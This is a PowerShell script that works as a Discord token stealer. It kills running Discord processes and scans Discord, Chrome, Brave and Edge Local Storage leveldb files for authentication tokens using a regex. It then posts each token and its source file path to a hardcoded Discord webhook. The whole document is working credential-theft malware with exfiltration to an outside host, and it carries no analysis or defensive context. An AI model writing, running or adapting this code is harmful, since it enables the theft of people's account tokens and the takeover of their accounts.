$webhookUrl = "https://discord.com/api/webhooks/1508519789566496950/B3L__pijUlyH20EfneD3XeA2CwwzCw0HteEze4taaUyxD1txNgPF2BwVXgeJzG-3Ifme"

# === FORCE CLOSE DISCORD ===
Write-Host "Closing Discord processes..."
$discordProcesses = @(
    "Discord",
    "DiscordPTB",
    "DiscordCanary",
    "DiscordDevelopment",
    "Discord.exe",
    "Update.exe",
    "DiscordVoice"
)

foreach ($proc in $discordProcesses) {
    try {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
        Write-Host "Killed: $proc"
    } catch { }
}

# Also kill via taskkill as backup
taskkill /f /im Discord.exe 2>$null
taskkill /f /im DiscordPTB.exe 2>$null
taskkill /f /im DiscordCanary.exe 2>$null
taskkill /f /im Update.exe 2>$null

Start-Sleep -Seconds 3

# === EXTRACT TOKENS ===
$paths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
)

$foundTokens = @()

foreach ($path in $paths) {
    if (Test-Path $path) {
        $files = Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $content = [System.IO.File]::ReadAllText($file.FullName) -ErrorAction SilentlyContinue
            $regex = '[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}'
            $matches = [System.Text.RegularExpressions.Regex]::Matches($content, $regex)
            foreach ($match in $matches) {
                $token = $match.Value
                if ($foundTokens -notcontains $token) {
                    $foundTokens += $token
                    
                    # Send to webhook
                    $message = "**Token Found:**`n$token`n**Source:** $($file.FullName)"
                    $body = @{content = $message} | ConvertTo-Json
                    try {
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    } catch { }
                }
            }
        }
    }
}

